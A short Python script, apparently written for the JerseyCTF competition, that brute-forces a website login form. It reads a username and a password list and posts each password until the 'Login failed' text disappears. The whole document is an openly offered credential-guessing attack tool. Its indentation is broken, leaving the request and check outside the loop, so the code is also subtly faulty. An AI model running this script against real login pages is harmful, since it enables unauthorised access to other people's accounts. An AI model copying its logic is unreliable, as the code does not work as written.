import requests

# define the webpage you want to crack

# this page must be a login page with a username and password

url = "http://www.jerseyctf.online/"

# let's get the username

username = input("What is the username you wish to attempt? ")

# next, let's get the password file

password_file = input("Please enter the name of the password file: ")

# open the password file in read mode

file = open(password_file, "r")

# now let's get each password in the password_file

for password in file.readlines():

# let's strip it of any \n

    password = password.strip("\n")

# collect the data needed from "inspect element"

data = {'username':username, 'password':password, "Login":'submit'}

send_data_url = requests.post(url, data=data)

if "Login failed" in str(send_data_url.content):

    print("[*] Attempting password: %s" % password)

else:

    print("[*] Password found: %s " % password)